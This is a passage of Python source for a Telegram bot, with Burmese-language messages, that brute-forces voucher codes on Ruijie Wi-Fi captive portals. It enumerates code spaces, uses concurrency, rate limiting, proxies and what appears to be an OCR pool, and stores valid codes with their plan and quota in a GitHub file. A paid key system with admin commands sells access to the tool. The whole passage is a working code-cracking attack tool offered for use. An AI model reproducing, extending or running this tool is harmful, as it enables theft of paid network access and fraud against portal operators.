                cid  = str(item["chat_id"])
                code = item["code"]
                if cid not in results:
                    results[cid] = []
                if code not in [r.get("code") if isinstance(r, dict) else r for r in results[cid]]:
                    results[cid].append({
                        "code":  code,
                        "plan":  item.get("plan",  "N/A"),
                        "usage": item.get("usage", "N/A"),
                        "quota": item.get("quota", "N/A"),
                    })
            await update_file_content("result.json", results, sha, "Periodic Update")
        except Exception as e:
            log.error(f"[github] update failed, requeuing {len(items)}: {e}")
            for item in items:
                await SUCCESS_CODE.put(item)

async def session_recheck_scheduler():
    """
    ⭐ Passive-only recheck — scan ကို ဘယ်တော့မှ မရပ်ရ၊ မဖျက်ရ။
    portal throttle false-positive နဲ့ scan speed မကျဖို့ warn only approach။
    """
    while True:
        await asyncio.sleep(SESSION_RECHECK_INTERVAL)
        for cid, data in list(user_data.items()):
            url = data.get('session_url')
            if not url:
                continue

            # ── Scan လုပ်နေရင် skip (fail counter ကိုပါ reset) ────────────
            task_data = scan_tasks.get(cid)
            if task_data and not task_data["task"].done():
                session_fail_count.pop(cid, None)
                log.debug(f"[recheck] skip {cid} — scan active")
                continue

            # ── Scan မလုပ်နေချိန်မှ passive check ─────────────────────────
            try:
                ok = await check_session_url(url)

                if ok is None or ok is True:
                    if ok is True:
                        session_fail_count.pop(cid, None)
                    continue

                # ok=False → explicit invalid marker
                fails = session_fail_count.get(cid, 0) + 1
                session_fail_count[cid] = fails
                log.warning(f"[recheck] fail {fails}/{SESSION_FAIL_THRESHOLD} for {cid}")

                if fails < SESSION_FAIL_THRESHOLD:
                    continue

                # ⭐ Threshold ကျော်ရင် warn ပေးသော်လည်း scan မရပ်ရ
                try:
                    await bot.send_message(
                        cid,
                        "⚠️ Session URL စစ်ဆေးရာ ပြဿနာတွေ့ပါသည်။\n"
                        "Scan ဆက်ရှာနေပါသည်။\n"
                        "ပြဿနာဆက်ဖြစ်ပါက /setup ဖြင့် URL အသစ်ထည့်ပါ။"
                    )
                except Exception:
                    pass
                # ⭐ user_data မဖျက်ရ၊ scan မရပ်ရ — fail count သာ reset
                session_fail_count.pop(cid, None)

            except Exception as e:
                log.debug(f"[recheck] {cid}: {e}")

# ── Bot Commands ──────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message,
        "Bot စတင်ပါပြီ။\n\n"
        "➤ /key  — Key အတည်ပြုပါ\n"
        "➤ /help — Command များကြည့်ပါ"
    )

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    await bot.reply_to(message,
        "📚 **Command လမ်းညွှန်**\n\n"
        "၁။ `/key`               — Key အတည်ပြုခြင်း\n"
        "၂။ `/setup <url>`       — Session URL ထည့်ခြင်း\n"
        "၃။ `/brute <mode> <len> [target]` — ရှာဖွေခြင်း\n"
        "   Mode: 1=0-9 | 2=a-z | 3=A-Z | 4=a-zA-Z | 5=a-z0-9\n"
        "   ဥပမာ: `/brute 1 6 5`\n"
        "၄။ `/stop`              — Scan ရပ်တန့်\n"
        "၅။ `/resume`            — ရပ်ခဲ့သော Scan ပြန်စခြင်း\n"
        "၆။ `/saved`             — ရလဒ်ကြည့်ခြင်း\n"
        "၇။ `/delete_saved`      — ရလဒ်ဖျက်ခြင်း\n"
        "၈။ `/recheck`           — Code များ ပြန်စစ်ခြင်း\n"
        "၉။ `/notify`            — Notification ON/OFF\n"
        "၁၀။`/status`            — Bot အခြေအနေ",
        parse_mode="Markdown",
    )

# ── Key Auth ──────────────────────────────────────────────────────────────
@bot.message_handler(commands=['key'])
async def handle_key(message):
    uid = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if uid not in auth_list:
        await bot.reply_to(message, "❌ Key မတွေ့ပါ။ Admin ကိုဆက်သွယ်ပါ။")
        return
    if check_key_expiration(auth_list[uid]):
        approve[message.chat.id] = True
        await bot.reply_to(message, "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် Session URL ထည့်ပါ။")
    else:
        approve[message.chat.id] = False
        await bot.reply_to(message, "❌ Key သက်တမ်းကုန်ပါပြီ။ Admin ကိုဆက်သွယ်ပါ။")

# ── Setup ─────────────────────────────────────────────────────────────────
@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    if not approve.get(message.chat.id, False):
        await bot.reply_to(message, "❌ /key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n`/setup your_session_url`", parse_mode="Markdown")
        return
    url = args[1]
    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")

    ok = await check_session_url(url)
    if ok is False:
        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည်။")
        return

    cid = message.chat.id
    _, portal_name = get_portal_config(url)
    user_data[cid] = {'session_url': url, 'portal_type': portal_name}

    for d in (success_texts, limited_texts, pending_brute,
              success_messages, limited_messages, session_fail_count):
        d.pop(cid, None)

    try:
        results, sha = await get_file_content("result.json")
        if str(cid) in results:
            del results[str(cid)]
            await update_file_content("result.json", results, sha, f"Clear codes for {cid}")
    except Exception as e:
        log.error(f"[setup] GitHub clear: {e}")

    resume_hint = ""
    if cid in last_scan_params:
        p = last_scan_params[cid]
        resume_hint = (
            f"\n\n💡 ယခင် scan ရှိပါသည် (mode:{p['mode']} len:{p.get('length','?')}).\n"
            f"/resume ဖြင့် ဆက်ရှာနိုင်သည်။"
        )
    await bot.reply_to(message,
        f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n🌐 Portal: {portal_name}{resume_hint}")

# ── Brute-force ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['brute'])
async def brute(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "❌ /key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
        return

    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message,
            "အသုံးပြုနည်း: `/brute <mode> <length> [target]`\n"
            "Mode: 1=0-9 | 2=a-z | 3=A-Z | 4=a-zA-Z | 5=a-z0-9\n"
            "ဥပမာ: `/brute 1 6 5`",
            parse_mode="Markdown",
        )
        return

    try:
        mode   = int(args[1])
        length = int(args[2])
        target = int(args[3]) if len(args) > 3 else None
        if mode not in range(1, 6):
            await bot.reply_to(message, "❌ Mode 1-5 ဖြစ်ရပါမည်။"); return
        if not 1 <= length <= 12:
            await bot.reply_to(message, "❌ Length 1-12 ဖြစ်ရပါမည်။"); return
        if target is not None and target < 1:
            await bot.reply_to(message, "❌ Target ≥ 1 ဖြစ်ရပါမည်။"); return
    except ValueError:
        await bot.reply_to(message, "❌ Mode, Length, Target — ဂဏန်းဖြစ်ရပါမည်။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
                   InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": []}
        p = last_scan_params[chat_id]
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode:{p['mode']} len:{p.get('length','?')} "
            f"idx:{p.get('start_index',0):,}).\nပြန်စမလား၊ အသစ်စမလား?",
            reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode, length, target, message)

async def start_brute_scan(chat_id, mode, length, target, original_message,
                           plan_filters=None, start_index=0):
    plan_filters  = plan_filters or []
    resume_note   = f" | Resuming from {start_index:,}" if start_index > 0 else ""
    progress_msg  = await bot.send_message(chat_id, f"Preparing…{resume_note}")
    scan_id       = str(uuid.uuid4())
    task          = asyncio.create_task(
        run_bruteforce(
            mode, length, chat_id, user_data[chat_id]['session_url'],
            scan_id, target, message=original_message,
            progress_msg=progress_msg, plan_filters=plan_filters,
            start_index=start_index,
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data:
        data["stop"] = True
        if not data["task"].done():
            data["task"].cancel()
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ ပြန်စရန် /resume ကိုသုံးပါ။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "❌ /key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
        return
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    p = last_scan_params.pop(chat_id)
    await start_brute_scan(
        chat_id, p['mode'], p.get('length', 6), p['target'],
        message, plan_filters=p.get('plan_filters', []),
        start_index=p.get('start_index', 0),
    )
    await bot.reply_to(message, f"ယခင် scan ပြန်စပါပြီ။ (index: {p.get('start_index', 0):,})")

@bot.callback_query_handler(func=lambda c: c.data in ("resume_scan", "new_scan"))
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume ရန် scan မရှိပါ။", chat_id=chat_id,
                                        message_id=call.message.message_id)
            return
        p = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id,
                                    message_id=call.message.message_id)
        await start_brute_scan(chat_id, p['mode'], p.get('length', 6), p['target'],
                                call.message, plan_filters=p.get('plan_filters', []),
                                start_index=p.get('start_index', 0))
    else:
        p = pending_brute.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
        if p:
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id,
                                        message_id=call.message.message_id)
            await start_brute_scan(chat_id, p['mode'], p.get('length', 6), p['target'],
                                    call.message, plan_filters=p.get('plan_filters', []))
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id,
                                        message_id=call.message.message_id)

# ── Saved / Delete / Notify ───────────────────────────────────────────────
@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return

    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        for item in success:
            ln = f"`{_md_escape(item['code'])}` – ⏳ {_md_escape(item.get('plan','N/A'))}"
            if item.get('usage', 'N/A') != 'N/A':
                ln += f"\n   📊 {_md_escape(item['usage'])}"
            if item.get('quota', 'N/A') != 'N/A':
                ln += f"\n   💾 {_md_escape(item['quota'])}"
            if item.get('expire', 'N/A') != 'N/A':
                ln += f"\n   📅 {_md_escape(item['expire'])}"
            if item.get('portal', 'N/A') != 'N/A':
                ln += f"\n   🌐 {_md_escape(item['portal'])}"
            parts.append(ln + "\n")
    if limited:
        parts.append(f"⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(limited)

    text = "\n".join(parts)
    for i in range(0, len(text), TG_MAX_LEN):
        await bot.send_message(chat_id, text[i:i+TG_MAX_LEN], parse_mode="Markdown")

@bot.message_handler(commands=['delete_saved'])
async def delete_saved(message):
    chat_id = message.chat.id
    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)
    try:
        results, sha = await get_file_content("result.json")
        if str(chat_id) in results:
            del results[str(chat_id)]
            await update_file_content("result.json", results, sha, f"Clear for {chat_id}")
    except Exception as e:
        log.error(f"[delete_saved] {e}")
    await bot.reply_to(message, "🗑️ Saved codes ဖျက်ပြီးပါပြီ။")

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
    notify_setting[chat_id] = not notify_setting.get(chat_id, DEFAULT_NOTIFY)
    await bot.reply_to(message, f"Notify: {'ON ✅' if notify_setting[chat_id] else 'OFF ❌'}")

# ── Recheck ───────────────────────────────────────────────────────────────
@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "❌ /key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck ရန် success code မရှိပါ။")
        return

    await bot.reply_to(message, "Success codes ပြန်လည်စစ်ဆေးနေပါသည်...")
    new_success = []
    removed_expired = []
    removed_invalid = []

    for item in success:
        code = item["code"]
        if is_expired(item.get("expire", "N/A")):
            removed_expired.append(code)
            continue
        res = await perform_check(user_data[chat_id]['session_url'], code,
                                   chat_id, recheck=True, message=message)
        if res:
            new_success.append(item)
        else:
            removed_invalid.append(code)

    success_texts[chat_id] = new_success
    try:
        results, sha = await get_file_content("result.json")
        cid_str = str(chat_id)
        if cid_str in results:
            kept = {i["code"] for i in new_success}
            results[cid_str] = [r for r in results[cid_str]
                                  if (r.get("code") if isinstance(r, dict) else r) in kept]
            await update_file_content("result.json", results, sha, f"Recheck {chat_id}")
    except Exception as e:
        log.error(f"[recheck] GitHub: {e}")

    parts = []
    if new_success:
        parts.append(f"✅ Still Valid ({len(new_success)}):\n" +
                     "\n".join(i["code"] for i in new_success))
    if removed_expired:
        parts.append(f"⏰ Expired removed ({len(removed_expired)}):\n" +
                     "\n".join(removed_expired))
    if removed_invalid:
        parts.append(f"❌ Invalid removed ({len(removed_invalid)}):\n" +
                     "\n".join(removed_invalid))
    if not parts:
        parts.append("Recheck ပြီးပါပြီ၊ valid code မကျန်ပါ။")
    await bot.reply_to(message, _truncate("\n\n".join(parts)))

# ── Status ────────────────────────────────────────────────────────────────
@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active = sum(1 for d in scan_tasks.values() if not d["task"].done())
    up     = int(time.monotonic() - _start_time)
    h, r   = divmod(up, 3600); m, s = divmod(r, 60)
    sem_info  = "N/A"
    rate_info = "N/A"
    if _voucher_sem:
        try:
            sem_info = f"{CONCURRENCY - _voucher_sem._value}/{CONCURRENCY}"
        except Exception:
            sem_info = f"?/{CONCURRENCY}"
    if _rate_limiter:
        rate_info = f"{len(_rate_limiter.timestamps)}/{MAX_VOUCHER_PER_MIN} per min"
    proxy_info = PROXY_URL if PROXY_URL else "Direct"
    await bot.reply_to(message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {h}h {m}m {s}s\n"
        f"🔍 Active Scans: {active}\n"
        f"👥 Sessions: {len(user_data)}\n"
        f"✅ Approved: {sum(1 for v in approve.values() if v)}\n"
        f"⚡ Concurrency: {CONCURRENCY}\n"
        f"🔒 Sem In-Use: {sem_info}\n"
        f"📦 Batch Size: {BATCH_SIZE}\n"
        f"📨 Queued: {SUCCESS_CODE.qsize()}\n"
        f"🌐 Portal: {DEFAULT_PORTAL}\n"
        f"🚦 Rate: {rate_info}\n"
        f"🔀 Proxy: {proxy_info}\n"
        f"🛡️ SSL: ENABLED\n"
        f"📅 Build: 2026-10-16"
    )

# ── Test Balance (Admin) ──────────────────────────────────────────────────
@bot.message_handler(commands=['testbalance'])
async def testbalance(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    targets = [
        {"chat_id": cid, **item}
        for cid, items in success_texts.items()
        for item in items
    ]
    if not targets:
        await bot.reply_to(message, "⚠️ Success code မရှိသေးပါ။")
        return
    await bot.reply_to(message, f"🔍 Testing {min(len(targets), 3)} code(s)...")
    for t in targets[:3]:
        cfg, _ = get_portal_config(user_data.get(t['chat_id'], {}).get('session_url'))
        bal = await get_balance(t["session_id"], cfg)
        await bot.send_message(
            message.chat.id,
            f"🎯 Code: `{_md_escape(t['code'])}`\n"
            f"🌐 Portal: {t.get('portal','N/A')}\n"
            f"⏳ Time: {bal.get('time','N/A')}\n"
            f"📊 Usage: {bal.get('usage','N/A')}\n"
            f"💾 Quota: {bal.get('quota','N/A')}\n"
            f"📋 Plan: {bal.get('plan','N/A')}\n"
            f"📅 Expire: {bal.get('expire','N/A')}",
            parse_mode="Markdown",
        )

# ── Admin Key Management ──────────────────────────────────────────────────
@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message,
            "Usage:\n`/genkey 7d 123456789`\n"
            "`/genkey unlimited 123456789`\n"
            "`/genkey 1h30m 123456789`",
            parse_mode="Markdown"
        )
        return
    plan, uid = args[1], args[2]
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "❌ Duration format မမှန်ပါ။ ဥပမာ: 30m, 1h, 7d, unlimited")
        return
    auth_list, sha = await get_file_content("auth_list.json")
    auth_list[uid] = {"expires_at": expiry, "plan": plan}
    await update_file_content("auth_list.json", auth_list, sha, f"Add key {uid}")
    await bot.reply_to(message,
        f"✅ Key Generated\n\n"
        f"USER  : `{uid}`\nPLAN  : {plan}\nEXPIRY: `{expiry}`",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage: `/delkey <user_id>`", parse_mode="Markdown")
        return
    uid = args[1]
    auth_list, sha = await get_file_content("auth_list.json")
    if uid not in auth_list:
        await bot.reply_to(message, f"❌ `{uid}` မတွေ့ပါ။", parse_mode="Markdown")
        return
    del auth_list[uid]
    await update_file_content("auth_list.json", auth_list, sha, f"Delete key {uid}")
    approve.pop(int(uid), None)
    user_data.pop(int(uid), None)
    await bot.reply_to(message, f"✅ Key Deleted: `{uid}`", parse_mode="Markdown")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    auth_list, _ = await get_file_content("auth_list.json")
    if not auth_list:
        await bot.reply_to(message, "Key မရှိသေးပါ။")
        return
    lines = []
    now   = datetime.now(timezone.utc)
    for uid, data in auth_list.items():
        if isinstance(data, dict):
            exp   = data.get("expires_at", "")
            plan  = data.get("plan", "?")
            if exp == "9999-12-31T23:59:59Z":
                exp_str = "Unlimited"
            else:
                try:
                    dt = datetime.fromisoformat(exp.replace("Z", "+00:00"))
                    if dt < now:
                        exp_str = "Expired ❌"
                    else:
                        diff = dt - now
                        d    = diff.days
                        hh, rem = divmod(diff.seconds, 3600)
                        mm  = rem // 60
                        exp_str = f"{d}d {hh}h {mm}m left"
                except Exception:
                    exp_str = exp
        else:
            plan, exp_str = "legacy", str(data)
        lines.append(f"👤 `{uid}`\n   Plan: {plan}\n   Expiry: {exp_str}")
    text = f"📋 Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
    for i in range(0, len(text), TG_MAX_LEN):
        await bot.send_message(message.chat.id, text[i:i+TG_MAX_LEN], parse_mode="Markdown")

# ── Polling ───────────────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            log.info("🤖 Polling started…")
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            log.warning(f"Polling: {e} — retry in {backoff}s")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            log.error(f"Polling unexpected: {e} — retry in {backoff}s")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

# ── Main ──────────────────────────────────────────────────────────────────
async def main():
    global session, _connector, _ocr_available, _rate_limiter, _voucher_sem

    # Init all async objects inside the running event loop
    _voucher_sem  = asyncio.Semaphore(CONCURRENCY)
    _rate_limiter = RateLimiter(MAX_VOUCHER_PER_MIN)

    # ⭐ OCR pool — asyncio.Queue ဖြင့် 6 ခု concurrent OCR run နိုင်
    _ocr_available = asyncio.Queue()
    for ocr_inst in _ocr_pool:
        _ocr_available.put_nowait(ocr_inst)
    log.info(f"✅ OCR pool ready ({_OCR_POOL_SIZE} instances)")

    _connector   = create_connector()
    session      = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=_connector, connector_owner=False,
    )

    log.info("🚀 Starting Ruijie Bot (2026 build)…")
    if PROXY_URL:
        log.info(f"🔒 All requests via proxy: {PROXY_URL}")
    else:
        log.info("🌐 Direct connection (no proxy)")

    loop       = asyncio.get_running_loop()
    stop_event = asyncio.Event()

    def _on_signal():
        log.info("⚠️ SIGTERM/SIGINT received — graceful shutdown…")
        stop_event.set()

    try:
        loop.add_signal_handler(signal.SIGTERM, _on_signal)
        loop.add_signal_handler(signal.SIGINT,  _on_signal)
    except NotImplementedError:
        pass  # Windows

    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        asyncio.create_task(session_recheck_scheduler())

        polling_task = asyncio.create_task(start_polling())
        done, pending = await asyncio.wait(
            [polling_task, asyncio.create_task(stop_event.wait())],
            return_when=asyncio.FIRST_COMPLETED,
        )
        for t in pending:
            t.cancel()
    finally:
        log.info("🛑 Closing sessions…")
        await session.close()
        await _connector.close()
        log.info("✅ Shutdown complete.")

if __name__ == '__main__':
    validate_env()
    asyncio.run(main())
